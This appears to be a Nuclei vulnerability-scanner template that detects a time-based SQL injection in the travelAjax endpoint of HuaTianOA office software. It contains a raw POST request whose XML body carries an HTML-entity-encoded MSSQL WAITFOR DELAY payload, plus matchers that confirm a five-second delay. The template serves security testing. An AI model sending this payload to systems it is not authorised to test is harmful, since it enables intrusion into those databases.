id: HuaTianOA-travelAjax-SqlInjection

info:
  name: HuaTianOA-travelAjax-SqlInjection
  author: iSee857
  severity: high
  description: |
    HuaTianOA-travelAjax-SqlInjection - This template detects a potential SQL Injection vulnerability in the travelAjax API endpoint of HuaTianOA.

http:
  - method: POST
    raw:
      - |
        POST /OAapp/bfapp/buffalo/travelAjax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/html

        <buffalo-call>
        <method>getLoanAmount</method>
        <string>&#49;&apos;&#32;&#87;&#65;&#73;&#84;&#70;&#79;&#82;&#32;&#68;&#69;&#76;&#65;&#89;&#32;&apos;&#48;&#58;&#48;&#58;&#53;&apos;&#45;&#45;&#32;</string>
        </buffalo-call>

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
      - type: status
        status:
          - 200
      - type: word
        words:
          - "double>"